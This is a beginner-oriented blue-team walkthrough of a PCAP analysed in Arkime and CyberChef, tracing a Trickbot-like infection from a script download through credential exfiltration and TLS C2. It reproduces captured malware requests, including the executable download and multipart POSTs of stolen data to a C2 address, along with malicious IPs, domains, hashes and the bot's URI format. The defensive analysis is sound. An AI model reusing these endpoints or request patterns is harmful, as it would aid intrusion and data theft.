---
title: Arkime-Only Walkthrough — Script Downloader to Credential Theft and TLS C2
tags:
  - blue-team
  - pcap
  - arkime
  - cyberchef
  - trickbot
  - c2
  - credential-theft
---

# Arkime-Only Walkthrough — Script Downloader to Credential Theft and TLS C2 { #arkime-only-walkthrough }

!!! abstract "Case summary"
    One Windows 10 workstation in the `mondogreek.com` domain fetched `YAS20.exe` with a **script** (no browser). Within 12 minutes it checked its public IP, opened encrypted C2 on ports **449** and **447**, downloaded more modules, **sent stolen browser passwords and a full reconnaissance dump in cleartext HTTP POSTs**, and swept the subnet on **SMB 445** (refused). The pattern is consistent with **Trickbot** (inferred; no hash lookup was possible offline). The whole case was solved **in the Arkime web UI only**, with CyberChef for decoding.

| | |
|---|---|
| **Evidence** | One PCAP, 2020-03-11 21:22:35 – 22:06:41 UTC (44 min 06 s), 1,131 sessions |
| **Environment** | Closed network, no internet (no VirusTotal, no OSINT). Arkime v5.6.4 web UI + CyberChef (offline) |
| **Deliverable** | Analysis, answers and IOCs |
| **Related pages** | [Arkime offline PCAP guide](../../network/arkime/offline-pcap-guide.md) · [Arkime search syntax](../../network/arkime/search-syntax.md) · [Beaconing & C2](../../network/beaconing-c2.md) · [EternalBlue / SMBv1](../../adversary/eternalblue-smbv1.md) |

!!! tip "How to read this page"
    It is written so a beginner can follow it from the start. Every step uses the same order:

    1. **Goal** — what the step tries to find out
    2. **Query** — copy it with the **copy button** on the right of the code block
    3. **Query explained** — what each piece means
    4. **Actual result** — what appears on screen
    5. **Reading the result** — what it means and why it is suspicious (or normal)

    **Question** boxes are questions asked during the analysis, with their answers. The [copy-ready query sheet](#query-sheet) at the end collects the queries with `<placeholders>` for your next PCAP.

## Answers at a glance { #answers }

| Item | Answer | Status |
|---|---|---|
| Infected host | **10.3.11.194 LAPTOP-7XMV2SN**, user **otis.witherspoon**, MAC `b8:ca:3a:ec:3b:8f`, Windows 10 Pro build 18363 | Confirmed |
| First malicious event | **21:24:36 UTC** — `GET /YAS20.exe` from `bolton-tech[.]com` (50.87.248.17) by `WinHttp.WinHttpRequest.5` | Confirmed |
| Network | 10.3.11.0/24, gateway 10.3.11.1, DC/DNS/DHCP **10.3.11.3 Mondogreek-DC**, domain `mondogreek.com` | Confirmed |
| C2 | TLS to **190.214.13.2:449** (persistent), **185.14.31.98:447** (downloads, self-signed `example.com` cert), 185.180.198.50:447 (no answer); HTTP POST to **203.176.135.102:8082** | Confirmed |
| Exfiltration | 5 cleartext POSTs 21:36:52–21:38:49: browser credentials (IE, Firefox), process list, systeminfo, ipconfig, net, nltest output | Confirmed |
| Lateral movement | SMBv1-only probes to 10.3.11.119, .218, .1, .131, .254 at 21:36:47 and 21:37:17 — **all refused** | Confirmed (attempt failed) |
| Scope | No other internal host talked to any external IOC | Confirmed |
| Malware family | Trickbot-like (URI `/yas20/<host>_W10018363.<botid>/81/`, ports 447/449, `example.com` / "Global Security" cert, module-based theft) | Inferred |

---

## Step 0 — How Arkime shows the data { #step-0 }

### What a session is { #sessions }

Arkime does not list packets one by one. It groups them into **sessions**. Think of a session as **"one conversation between A and B"** — for example `10.3.11.194:51234 → 8.8.8.8:53` is one session.

Each session carries:

- Start Time and Stop Time
- Packets and bytes
- Protocols (tcp, udp, http, tls, dns …)
- Parsed fields where available: HTTP host/URI/User-Agent, TLS certificates, DNS names

### The screens you will use { #tabs }

| Tab | Used for |
|---|---|
| **Sessions** | The list of sessions for a search. Click `+` at the left of a row to open the session detail and packets |
| **SPI View** | "Which values appear in each field, and how many times" — the same job as Splunk's `stats count by field` |
| **Connections** | A graph of who talks to whom |
| **Files** | The PCAP files Arkime has imported |
| **Settings** | Time zone (set it to **UTC**) |

At the top of the Sessions screen you have the **search bar**, then the **time range** (Start / End), **Bounding**, and the **timeline bar chart**.

### Trap 1 — the time range { #time-range }

!!! warning "The default is Last hour"
    The time-range drop-down usually starts at **Last hour**. If the PCAP is days old, **nothing appears**. Most "there is no data?" moments come from this.

    - If you know the window, type **Start / End** yourself.
    - If not, set it to **All** to see where the data starts and ends.
    - Leave the search bar empty and press **Search**.

The **timeline bar chart** then appears. Look for two things:

- When the data starts and ends
- Sudden spikes — busy periods worth revisiting

The **Session / Packets / Bytes** buttons above the chart change what is counted. **A spike in Bytes** can mean a large file transfer — a clue when you later hunt for exfiltration.

### Trap 2 — the time zone { #timezone }

!!! warning "Times are shown in the browser's time zone"
    Arkime shows times in **your PC's local time** by default, but reports are usually written in **UTC**. On a PC at UTC+10:30, missing this shifts **every time by 10.5 hours**.

    User menu at the top right → **Settings → General → Timezone Format → UTC**. Afterwards the chart axis shows `UTC` after each time (e.g. `2020/03/11 21:25:00 UTC`) — a quick way to confirm the setting.

---

## Step 1 — Data start, end and session count { #data-range }

**Goal:** know when the data starts and ends and how big it is. Every time in the report must fall inside this range.

!!! question "Question: Arkime works in sessions — so how do I see when the data starts and ends?"
    Each session has a **Start Time** (first packet) and a **Stop Time** (last packet). So:

    - **Data start** = the **earliest Start Time** of all sessions
    - **Data end** = the **latest Stop Time** of all sessions

    **Method 1: sort the session list (most accurate)**

    1. Sessions tab, time range **All**, empty search, **Search**
    2. Click the **Start Time** column header. One click sorts ascending (oldest first), another click descending. The small arrow shows the direction.
    3. Ascending → **first row's Start Time = data start**
    4. Click **Stop Time** until it is **descending** (newest first) → **first row's Stop Time = data end**

    Why not Start Time descending for the end? A session that started early and ran long (a big download or a C2 connection) can have an early Start Time **but the latest Stop Time**. So the end comes from Stop Time.

    **Method 2: the timeline chart (rough)**

    With the range on All, the **leftmost and rightmost bars** bound the data. Hover a bar to see its time. Good for a quick feel, not accurate to the second — use method 1 for the report.

    **Method 3: the Files tab (reference)**

    The **First Date** column shows each PCAP's first packet. Useful when several files were imported. It gives no end time.

**Total sessions** appear above the list:

```text
Showing 1 - 50 of 1,131 entries
```

**Actual result:**

```text
Start  2020/03/11 21:22:35 UTC
End    2020/03/11 22:06:41 UTC
Duration 00:44:06   (shown at the right of the time bar)
Sessions 1,131
```

`00:44:06` at the right of the time bar is the data length. **Bounding: First Packet** means "show sessions whose first packet falls inside the range".

---

## Step 2 — The big picture: protocols and internal hosts { #step-1 }

**Goal:** see what kind of traffic dominates and decide who is internal and who is external. This is the **baseline** — what "normal" looks like, so that "unusual" stands out later.

**Query:** empty search → Search → **SPI View** tab → **General** section.

**Actual result:**

```text
Protocols  tcp (672)  udp (458)  tls (349)  dns (325)  http2 (126)  ldap (79)  krb5 (78)
           http (44)  dcerpc (41)  smb (30)  llmnr (29)  ssdp (16)  ntp (9)  mdns (8)  quic (6)  igmp (1)
Src IP     10.3.11.119 (491)  10.3.11.194 (377)  10.3.11.218 (259)  10.3.11.3 (3)  52.242.211.89 (1)
```

The number in brackets is the **session count** for that value.

### Reading the protocols { #protocols }

| Protocols | Meaning | Verdict |
|---|---|---|
| `ldap` (79), `krb5` (78), `dcerpc` (41), `smb` (30), `dns` (325) | Windows PCs logging on to a domain and pulling policy | **Active Directory environment.** Normal — but SMB/DCERPC **between workstations** later would suggest lateral movement |
| `llmnr`, `ssdp`, `mdns`, `igmp` | Windows looking for neighbours | Background noise. Ignore for now |
| `tls` (349), `http2` (126), `quic` (6) | Encrypted web traffic | Content invisible; judge by certificates, destinations, sizes |
| `http` (44) | **Cleartext** web traffic | URLs, file names and User-Agents are all visible — **the best place to start hunting** |

Note anything **unexpected** here. For example `ssh`, `irc` or `rdp` on a workstation network would be worth writing down. There were none in this data.

### Internal or external { #internal-external }

The report separates **INTERNAL and EXTERNAL IPs**, so decide this first. Private ranges are internal; everything else is external.

| Private range | From – to | CIDR |
|---|---|---|
| 10.x.x.x | 10.0.0.0 – 10.255.255.255 | `10.0.0.0/8` |
| 172.16–31.x.x | 172.16.0.0 – 172.31.255.255 | `172.16.0.0/12` |
| 192.168.x.x | 192.168.0.0 – 192.168.255.255 | `192.168.0.0/16` |

Sessions started by internal hosts only:

```text
ip.src == 10.0.0.0/8
```

| Piece | Meaning |
|---|---|
| `ip.src` | Source IP field (`ip` alone matches source or destination; `ip.dst` destination only) |
| `==` | "equals" |
| `10.0.0.0/8` | CIDR: 10.0.0.0 to 10.255.255.255. Arkime accepts CIDR in IP fields |

The result is a session list; each row reads `Start Time | Stop Time | Src IP / Port | Dst IP / Port | Packets | Databytes / Bytes | Info`.

**Reading the result:**

- **The internal network is `10.3.11.0/24`.** Almost every initiator is `10.3.11.x`.
- **10.3.11.119, .194 and .218** produce most traffic → likely user **workstations**.
- **10.3.11.3 starts only 3 sessions.** Servers mostly **receive**, so they show up rarely as a source → **a server, probably the domain controller**. Checked in [step 3](#dc).
- **52.242.211.89 (1)** — an external IP as a **source**. Usually internal hosts start connections, so it stands out. Two common causes:
    - The session **was already open before the capture started**, so the first packet Arkime saw came from the server (common, usually harmless)
    - A real inbound connection (needs attention)

    Checked in [step 5](#step-3).

---

## Step 3 — Confirm the DC { #dc }

**Goal:** confirm that 10.3.11.3 really is the domain controller.

**Query:**

```text
ip.dst == 10.3.11.3
```

| Piece | Meaning |
|---|---|
| `ip.dst` | Destination IP field |
| `== 10.3.11.3` | "Show only sessions **going to** 10.3.11.3" |

**Actual result (SPI View → General):**

```text
Dst IP     10.3.11.3 (571)
Protocols  udp (371)  dns (325)  tcp (200)  ldap (79)  krb5 (78)  dcerpc (41)  smb (24)  ntp (9)
Src IP     10.3.11.119 (251)  10.3.11.194 (170)  10.3.11.218 (150)
```

**Reading the result:**

- All 571 incoming sessions are **dns, ldap, krb5, dcerpc, smb, ntp**. Name lookups + Kerberos logons + directory queries + RPC + SMB (policy files) + NTP (time sync) converging on one server = a typical **DC and DNS server**.
- All 78 krb5 sessions in the PCAP go to this server.
- The chart axis shows `21:25:00 UTC` → the **time zone is set to UTC** correctly.

!!! tip "Check by port too"
    In the General section click the **Dst Port** field button. `53 (DNS)`, `88 (Kerberos)`, `389 (LDAP)`, `135 (RPC)`, `445 (SMB)` confirm a DC.

---

## Step 4 — Hostnames and users from Kerberos { #step-2 }

**Goal:** the report needs **IP + hostname**. Kerberos traffic carries both computer and user account names.

**Query:**

```text
ip.src == 10.3.11.0/24 && protocols == krb5
```

| Piece | Meaning |
|---|---|
| `ip.src == 10.3.11.0/24` | Source is any internal host |
| `&&` | AND — both conditions must match |
| `protocols == krb5` | Kerberos sessions only |

Search, then in **SPI View** scroll to the **krb5** section and open it.

!!! question "Question: the krb5 section only shows names like cname, cname Cnt, Realm — no values. What do I do?"
    For speed, SPI View shows **field names first and loads values only when asked**. `cname`, `Realm`, `sname` are **field buttons**, not values. Dst IP, Protocols and Src IP showed values straight away in step 2 only because those three are on by default.

    To see values, either:

    - **Click the `cname` button** (the name part) → loads only cname values, or
    - Click **Load All** on the right → loads every field in the krb5 section. Easiest at first.

    Field meanings:

    | Field | Meaning |
    |---|---|
    | **cname** | The account asking to authenticate. Ending in `$` = a **computer (hostname)**; without `$` = a **user** |
    | **Realm** | Domain name |
    | **sname** | The service requested: `krbtgt/<domain>` logon ticket, `cifs/<server>` file sharing, `ldap/<server>` directory, `host/<pc>` the PC itself |
    | **cname Cnt** and other `Cnt` | "How many values one session had". Ignore for now |

**Actual result (after Load All):**

```text
cname   laptop-i9zpi04$ (8)  otis.witherspoon (6)  laptop-7xmv2sn$ (4)  laptop-sqsa42o$ (4)
        LAPTOP-7XMV2SN$ (2)  LAPTOP-I9ZPI04$ (2)  LAPTOP-SQSA42O$  dominga.mcdowell (2)  dorian.neff (2)
Realm   MONDOGREEK.COM (62)  MONDOGREEK (8)  mondogreek.com (8)
sname   krbtgt/MONDOGREEK.COM (26)  cifs/Mondogreek-DC.mondogreek.com (9)  krbtgt/MONDOGREEK (8)
        krbtgt/mondogreek.com (8)  ldap/Mondogreek-DC.mondogreek.com (6)  LDAP/Mondogreek-DC.mondogreek.com (5)
        cifs/MONDOGREEK.COM (3)  cifs/Mondogreek-DC (3)  host/laptop-7xmv2sn.mondogreek.com (2) …
```

**Reading the result:**

- **Domain: `MONDOGREEK.COM`** (Realm)
- `cifs/Mondogreek-DC.mondogreek.com` and `ldap/Mondogreek-DC…` in sname → **DC name `Mondogreek-DC`**
- Computer accounts (`$`): laptop-i9zpi04, laptop-7xmv2sn, laptop-sqsa42o (case does not matter)
- User accounts: otis.witherspoon, dominga.mcdowell, dorian.neff

### Pairing names with IPs { #pairing }

**Click** a cname value (e.g. `laptop-7xmv2sn$`). A small menu appears; choose **and** to add a condition to the search:

```text
ip.src == 10.3.11.0/24 && protocols == krb5 && krb5.cname == "laptop-7xmv2sn$"
```

| Piece | Meaning |
|---|---|
| `krb5.cname` | Kerberos cname field |
| `== "…"` | Only this value. Quoted because values can contain special characters such as `$` |

Search again and read **Src IP** in the General section — that is the IP using the name. Repeat per name. Or go the other way, one IP at a time:

```text
ip.src == 10.3.11.194 && protocols == krb5
```

**Final table:**

| IP | Role | Hostname | User |
|---|---|---|---|
| 10.3.11.3 | Domain controller / DNS | Mondogreek-DC | — |
| 10.3.11.119 | Workstation | LAPTOP-SQSA42O | dorian.neff |
| 10.3.11.194 | Workstation | LAPTOP-7XMV2SN | otis.witherspoon |
| 10.3.11.218 | Workstation | LAPTOP-I9ZPI04 | dominga.mcdowell |

The report can now name every IP with its hostname.

---

## Step 5 — Check the external "initiator" 52.242.211.89 { #step-3 }

**Goal:** find out why an external IP looks like it started a session — a real inbound attack, or an illusion.

**Query:**

```text
ip.src == 52.242.211.89
```

**Actual result:** one session. Click `+` to open the detail.

```text
Time        2020/03/11 21:32:00 UTC - 21:32:00 UTC
Src IP/Port 52.242.211.89 : 443 { ARIN }
Dst IP/Port 10.3.11.194 : 50355
Src         Packets 1  Bytes 229  Databytes 0
Dst         Packets 1  Bytes 54   Databytes 0
Src Ethernet  20:e5:2a:b6:93:f1  OUI Netgear
Dst Ethernet  b8:ca:3a:ec:3b:8f  OUI Dell Inc.
TCP Flags   SYN 0  SYN-ACK 0  ACK 0  PSH 1  RST 1  FIN 0  URG 0
```

**Reading the result (practice reading a session detail):**

**① TCP flags: `SYN 0 SYN-ACK 0 PSH 1 RST 1`**
A normal TCP connection always starts with **SYN → SYN-ACK → ACK** (the 3-way handshake):

```text
client → server  SYN        "may I connect?"
server → client  SYN-ACK    "yes"
client → server  ACK        "starting"
```

SYN is 0 here, so **Arkime never saw the connection start**. The laptop opened it earlier; the start is not in the capture.

**② Ports: `52.242.211.89:443 → 10.3.11.194:50355`**
443 is an HTTPS **server** port; 50355 is a temporary client port (ephemeral, usually 49152+). In reality **the laptop (client) connected to the server**; Arkime labelled the server as the source only because the first packet it saw came from the server.

**③ Packet flow: one server PSH → one laptop RST**
PSH = "deliver this data now"; RST = "drop this connection (I don't know it)". The server sent data on a connection the laptop had already closed, so the laptop answered with RST. A routine clean-up.

**④ Payload: unreadable**
TLS-encrypted data — unreadable is normal.

**⑤ MAC tip**
Src MAC is **Netgear** (router/gateway), Dst MAC is **Dell** (laptop). Packets from external IPs always arrive through the gateway, so **an external IP always shows the gateway's MAC**. An external IP next to an internal device's MAC would be the odd case.

**Conclusion:** `{ ARIN }` is a US-registered range (Microsoft Azure). Not an inbound attack — **the tail of an HTTPS connection that was closing**. Benign. **Log what you ruled out** as well, so another analyst does not repeat the check.

---

## Step 6 — Sweep the 44 cleartext HTTP sessions { #step-4 }

**Goal:** start the real hunt. HTTP is unencrypted, so **where the host went and what it fetched** are all visible.

**Query:**

```text
ip.src == 10.3.11.0/24 && protocols == http
```

| Piece | Meaning |
|---|---|
| `ip.src == 10.3.11.0/24` | Connections started by internal hosts |
| `&&` | AND |
| `protocols == http` | Cleartext HTTP only |

Search → **SPI View** → **http** section → **Load All**.

### The fields that matter { #http-fields }

| Field | Meaning | Why |
|---|---|---|
| **Hostname** (`host.http`) | Domain requested | Where it went |
| **URI** | Path and file | What it fetched (e.g. `/files/update.exe`) |
| **Request Method** | `GET` fetch, `POST` send | Many outbound POSTs → exfil or C2 |
| **Status Code** | `200` OK, `404` not found … | Did it actually get the file |
| **Useragent** | The program that made the request | Non-browser values are suspicious |
| **Body Magic** | The body's **real file type** | `application/x-dosexec` = Windows executable (.exe/.dll). Renaming the file to `.jpg` does not change it |
| **Body MD5** | MD5 of the body | An IOC for later |

### Remove the normal noise first { #noise }

Windows talks HTTP to places like these all the time — skip them:

```text
www.msftconnecttest.com   /connecttest.txt    (internet connectivity check)
ctldl.windowsupdate.com   /msdownload/...     (certificate trust list update)
ocsp.digicert.com         /MFEw...            (certificate revocation check)
crl.securetrust.com       /STCA.crl           (certificate revocation list)
```

Noise removed in this data:

- `ctldl.windowsupdate.com`, `ocsp.digicert.com`, `crl.securetrust.com` — User-Agent `Microsoft-CryptoAPI/10.0` (4), normal Windows behaviour
- `fonts.googleapis.com`, `fonts.gstatic.com`, `ajax.googleapis.com` — web fonts and jQuery
- `wsimg.com`, `nebula.wsimg.com`, `img.secureserver.net` — GoDaddy site images and scripts
- `notable-quotes.com`, `newegg.com`, `tuscaloosabarnyard.com` — sites the user browsed (real Edge/Chrome User-Agent)

With the normal traffic gone, what is left stands out.

### Four candidates { #http-candidates }

**① `bolton-tech.com/YAS20.exe` — an executable download**

The URI ends in `.exe`, **Body Magic shows `application/x-dosexec` (2)**, and a server response has content-type `application/x-msdownload` (1). Evidence that a **Windows executable came down over HTTP**. Fetching an EXE over plain HTTP from an unknown site is very suspicious.

**② `64.44.133.131/images/cursor.png` (2), `/images/imgpaper.png` (1) — HTTP straight to an IP**

No domain, just an **IP address** ("naked IP"). Normal websites almost always use a domain. The names say `.png`, but there were two `x-dosexec` bodies. If one is YAS20.exe, **the other may be one of these "png" files** — an **executable pretending to be an image**. Checked in [step 9](#step-6).

**③ `203.176.135.102:8082/yas20/LAPTOP-7XMV2SN_W10018363.CF3A…/81/` — the most telling**

Split the URI into pieces:

```text
203.176.135.102:8082   → raw IP + non-standard port 8082
/yas20/                → campaign / group tag (same name as YAS20.exe!)
LAPTOP-7XMV2SN         → hostname of 10.3.11.194 (found in step 4)
W10018363              → Windows 10 build 18363
CF3A0EAB425F...CAED6   → unique ID per infected PC (bot ID)
/81/ , /90/            → command / data-type number
```

**The infected PC reports to the attacker's server with its own name in the URL.** And the numbers line up: `/81/` × 4 + `/90/` × 1 = **5**, **exactly 5 POSTs**, and **5** `multipart/form-data` bodies (the upload format), each with a random uppercase boundary such as `---------ATBOXLGQOOBDZTLA`. So these 5 POSTs are probably **data uploaded from the PC to the attacker** — **C2 or exfiltration**. (This pairing is still an **inference** — checked in [step 10](#step-7).)

The `yas20` tag and the `/<hostname>_W10<build>.<botid>/<number>/` format **closely match Trickbot's C2 pattern**. Still a hypothesis at this point.

**④ `checkip.amazonaws.com` — "what is my public IP?"**

People almost never open this address. Malware often uses it right after infection to learn **which country and which company network it has landed in**.

### Odd User-Agents { #user-agents }

```text
KSKJJGJ (1)                                                     ← meaningless letters, very odd
WinHTTP loader/1.0 (1)                                          ← a program, not a browser
Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5) (1)   ← value used by scripts (VBS/JS/PowerShell)
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; ...) (4)    ← IE 7 on Windows 10? impossible. 4 = the 4 x /81/
```

---

## Step 7 — Line the candidates up in time { #step-5 }

**Goal:** collect the candidates **in one search and sort by time** to see the attack flow (download → run → C2).

**Query:**

```text
host.http == bolton-tech.com || ip.dst == 64.44.133.131 || ip.dst == 203.176.135.102 || host.http == checkip.amazonaws.com
```

| Piece | Meaning |
|---|---|
| `host.http == bolton-tech.com` | Sessions whose HTTP Host header is bolton-tech.com |
| <code>&#124;&#124;</code> | OR — show it if **any one** matches (`&&` needs both, <code>&#124;&#124;</code> needs one) |
| `ip.dst == 64.44.133.131` | Sessions to this IP — no domain here, so search by IP |

There is deliberately **no source condition**: the result will tell us **which PC** did this.

Search → **Sessions** tab → sort **Start Time ascending**.

**Actual result (9 sessions, all 10.3.11.194):**

```text
Start     Src IP:Port          Dst IP:Port            Packets  Bytes      Info
21:24:36  10.3.11.194:49727 → 50.87.248.17:80          389     488,507    bolton-tech.com/YAS20.exe
21:32:00  10.3.11.194:49787 → 18.235.112.207:80         11         950    checkip.amazonaws.com/
21:36:45  10.3.11.194:49816 → 64.44.133.131:80         979   1,218,352    /images/cursor.png  /images/imgpaper.png
21:36:52  10.3.11.194:50080 → 203.176.135.102:8082      11       1,396    /yas20/LAPTOP-7XMV2SN_.../81/
21:36:55  10.3.11.194:50081 → 203.176.135.102:8082      11       1,673    /yas20/LAPTOP-7XMV2SN_.../81/
21:36:57  10.3.11.194:50082 → 64.44.133.131:80         540     611,579    /images/cursor.png
21:36:59  10.3.11.194:50091 → 203.176.135.102:8082      19       6,771    /yas20/LAPTOP-7XMV2SN_.../90
21:37:19  10.3.11.194:50098 → 203.176.135.102:8082      11       1,341    /yas20/LAPTOP-7XMV2SN_.../81/
21:37:52  10.3.11.194:50099 → 203.176.135.102:8082      11       1,332    /yas20/LAPTOP-7XMV2SN_.../81/
```

**Reading the result:** all 9 sessions come from **10.3.11.194 (LAPTOP-7XMV2SN, otis.witherspoon)**. The infected PC narrows to this one host.

```text
21:24:36  YAS20.exe download          → bolton-tech.com (50.87.248.17:80)
   ↓ about 7 min 30 s later
21:32:00  public IP check             → checkip.amazonaws.com
   ↓ about 4 min 45 s later
21:36:45  two "png" downloads         → 64.44.133.131:80  (about 1.2 MB)
21:36:52  first POST /81/             → 203.176.135.102:8082
21:36:55  POST /81/
21:36:57  cursor.png again            → 64.44.133.131:80  (about 610 KB)
21:36:59  POST /90  (largest, ~2 min) → 203.176.135.102:8082
21:37:19  POST /81/
21:37:52  POST /81/   ← no more HTTP to these IPs until 22:06
```

A textbook infection sequence: **① fetch the malicious file → ② run and check where it is → ③ fetch more modules → ④ report to the attacker's server**.

### Reading the YAS20.exe session { #yas20 }

Open the session: at the bottom you see **Source** (what the PC sent) and **Destination** (what the server sent).

**1. A script fetched it, not a browser.**

```http
GET /YAS20.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
Host: bolton-tech.com
```

Only four request headers. If a person had clicked a link in Edge, there would be `Referer` (which page it came from), `Accept-Language` and more, and the User-Agent would look like `...Edg/80...`. `WinHttp.WinHttpRequest.5` is the Windows component **VBScript, JScript, PowerShell and Office macros** use to download files. So **the user most likely opened a malicious document or script, which quietly fetched the EXE**. This is the **initial access** clue.

**2. The server returned an executable.**

```http
HTTP/1.1 200 OK
Date: Wed, 11 Mar 2020 21:24:36 GMT
Server: Apache
Last-Modified: Tue, 10 Mar 2020 11:32:37 GMT
Content-Length: 466944
host-header: c2hhcmVkLmJsdWVob3N0LmNvbQ==
Content-Type: application/x-msdownload
```

`Content-Type: application/x-msdownload`, `Content-Length: 466944` (about 456 KB). `Last-Modified: 10 Mar 2020` — **the file was placed on the server the day before the infection**.

**3. CyberChef practice: decode the odd header**

```text
host-header: c2hhcmVkLmJsdWVob3N0LmNvbQ==
```

A trailing `==` is the classic shape of **Base64**. Put it into CyberChef **From Base64**:

```text
shared.bluehost.com
```

A **shared web-hosting platform**. bolton-tech.com is therefore more likely **an ordinary site that was hacked and used as a file drop** than a site the attacker built.

---

## Step 8 — Judging on a closed network, and CyberChef { #closed-network }

### Without internet { #offline }

Real operational networks are usually closed.

| Cannot do | Do instead |
|---|---|
| VirusTotal hash lookups, domain/IP reputation, web searches | **Judge maliciousness from behaviour visible in the traffic** |

Behavioural evidence used in this case:

- Body Magic is `x-dosexec` → an executable was downloaded
- Connection by raw IP, on a non-standard port (8082)
- The URI carries the PC name and a unique ID
- POSTs (uploads) to the outside
- Non-browser User-Agents
- Repeated connections or long-held connections (beaconing)

One alone is weak; **several on the same host in the same time window** make a strong case.

- **Still record Body MD5.** It cannot be looked up now, but as a report IOC it serves internal threat-intel or the malware team later. *"Further malware analysis is required"* is the sentence for exactly this.
- Save the sessions with **Download PCAP** as evidence (EVIDENCE LOCATIONS).
- A malware family name based on analyst knowledge is written as **"Trickbot-like pattern (unconfirmed)"** or **"consistent with Trickbot"**, not as a fact.

### What CyberChef is for { #cyberchef }

| Use | Recipe | Example |
|---|---|---|
| Decode uploaded data | **From Base64**, **URL Decode** | Make an encoded body readable |
| Identify a file | **Detect File Type**, **MD5 / SHA256** | An executable starts with `MZ` |
| Read numeric times | **From UNIX Timestamp** (unit: milliseconds) | Example below |
| Defang IOCs for the report | **Defang URL**, **Defang IP Addresses** | `zoomer.com` → `zoomer[.]com` |

Numbers like this often appear in URLs (even in this PCAP's normal traffic):

```text
img.secureserver.net/t/1/tl/event?cts=1583961855884&...
```

`1583961855884` is **UNIX time in milliseconds**. From UNIX Timestamp (Milliseconds) gives:

```text
Wed 11 March 2020 21:24:15.884 UTC
```

Inside the capture window (21:22–22:06). This is how you cross-check a time embedded in a URL against the session time.

---

## Step 9 — The downloaded files: type and hashes { #step-6 }

**Goal:** confirm whether the three downloads are executables and record their hashes.

**Query:**

```text
host.http == bolton-tech.com || ip.dst == 64.44.133.131
```

**Actual result (SPI View → http):**

```text
Body Magic      application/x-dosexec (2)
Body Magic Cnt  1 (2)
Body MD5        179345004c39336eaba39863b95f268b (1)  9dfb3952172deeddb3a5e3cafed933bc (1)  e40d7846eae7d8a98c0e3512e5461e4c (1)
Body MD5 Cnt    1 (1)  2 (1)
```

Destination (server response) of the "png" sessions:

```http
HTTP/1.1 200 OK
Server: nginx/1.6.2
Date: Wed, 11 Mar 2020 21:36:59 GMT
Content-Type: Content-type: application/octet-stream
Content-Length: 582656
Connection: keep-alive

imgpaper.png
```

```http
HTTP/1.1 200 OK
Server: nginx/1.6.2
Date: Wed, 11 Mar 2020 21:37:06 GMT
Content-Type: Content-type: application/octet-stream
Content-Length: 582144
Connection: keep-alive

cursor.png
```

Request (Source):

```http
GET /images/cursor.png HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
User-Agent: WinHTTP loader/1.0
Host: 64.44.133.131
```

**Reading the result — the two "png" files are very likely not images.**

- Sizes `582656` and `582144` bytes — **about 570 KB**, far too big for a cursor image.
- `Content-Type: Content-type: application/octet-stream` — **the header name appears twice**. Normal web servers never send that; it points to a hand-made malicious server.
- The requesting User-Agent is `WinHTTP loader/1.0` — literally a "loader" (downloader) program.
- The blue `imgpaper.png` / `cursor.png` under the response are links to the body that Arkime extracted as a file (see [step 11](#body-view)).

!!! tip "Confirm by the bytes"
    A real PNG body starts with `‰PNG`. An executable looks like this:

    ```text
    MZ......This program cannot be run in DOS mode.
    ```

    `MZ` and `This program cannot be run in DOS mode` are the **fingerprint of a Windows executable (PE)**. You can also download the body and use CyberChef **Detect File Type**.

!!! note "Which MD5 belongs to which file"
    SPI View cannot tell you which of the three MD5s belongs to which file. Open each session's HTTP section and read its Body MD5. That pairing was not done here, so the report says "per-file mapping not confirmed".

---

## Step 10 — Confirm the POSTs and the upload direction { #step-7 }

!!! question "Question: how did you know the 21:36:59 session was a POST?"
    Honestly, at that point it was **inferred from the counts, not seen in the session**. Three numbers in the SPI View http section lined up:

    ```text
    Request Method:            GET (39)   POST (5)
    http.request.content-type: multipart/form-data ... 5 values (1 each)
    URI:  .../81/ (4)   .../90 (1)    → total 5
    ```

    Of 44 HTTP sessions, **exactly 5 were POSTs**, the URIs to 203.176.135.102 were **4 + 1 = 5**, and there were **5** upload bodies. Every other site was a GET for images, fonts or scripts — hence "these 5 are the POSTs".

    That is an **inference**, not evidence. **SPI View only counts; it does not pair values with sessions.** The session list's Info column shows the URI but not the method. Always confirm before it goes in a report:

    ```text
    http.method == POST
    ```

    | Piece | Meaning |
    |---|---|
    | `http.method` | HTTP request-method field |
    | `== POST` | POSTs only |

    **5 results**, all `10.3.11.194 → 203.176.135.102:8082` → the inference holds. A different destination in the list would have been a new lead. The session detail also shows `Method POST (1)`.

**/90 session detail (21:36:59):**

```text
Time          2020/03/11 21:36:59 UTC - 21:38:49 UTC
Src IP/Port   10.3.11.194 : 50091
Dst IP/Port   203.176.135.102 : 8082 { APNIC }
Src           Packets 10  Bytes 6,161  Databytes 5,609
Dst           Packets 9   Bytes 610    Databytes 120
TCP Flags     SYN 1  SYN-ACK 1  ACK 12  PSH 4  RST 0  FIN 2
HTTP          Method POST (1)  Status 200  User-Agent KSKJJGJ
              content-type multipart/form-data; boundary=aksgja8s8d8a8s97
              server Cowboy   response content-type text/plain
```

```http
POST /yas20/LAPTOP-7XMV2SN_W10018363.CF3A0EAB425F1927835EF064A69CAED6/90 HTTP/1.1
Content-Type: multipart/form-data; boundary=aksgja8s8d8a8s97
User-Agent: KSKJJGJ
Host: 203.176.135.102:8082
Content-Length: 5366
Cache-Control: no-cache
```

```http
HTTP/1.1 200 OK
server: Cowboy
date: Wed, 11 Mar 2020 21:37:00 GMT
content-length: 3
Content-Type: text/plain

/1/
```

**Reading the result:**

- **Src (PC → server) databytes 5,609**, **Dst (server → PC) 120**. The PC **uploaded** about 5.4 KB (`Content-Length: 5366`); the server only answered `/1/`, 3 bytes meaning **"received"**. **How to read direction:** compare Src and Dst bytes — the bigger side is the one sending data.
- User-Agent `KSKJJGJ` is meaningless letters — set by the malware itself.

---

## Step 11 — How to see an uploaded body { #body-view }

Under Source in the /90 session, instead of the body there is only a blue **`90`**.

!!! question "Question: I switched `natural` to `ascii`, but I still only see the blue 90."
    `natural` / `ascii` / `utf8` / `hex` only change **how characters are displayed**. Turning the body into a file link is done by a **separate option**.

    **Method 1: turn off "Images & Files" in Packet Options**

    **Packet Options ▾** to the right of `natural` → **Hide Images & Files**. Some versions show a ticked `Show Images & Files` instead — untick it. With the option on, Arkime **extracts HTTP bodies as files and shows only a link**. With it off, the body is printed as raw bytes, and `ascii` or `hex` then show the multipart content.

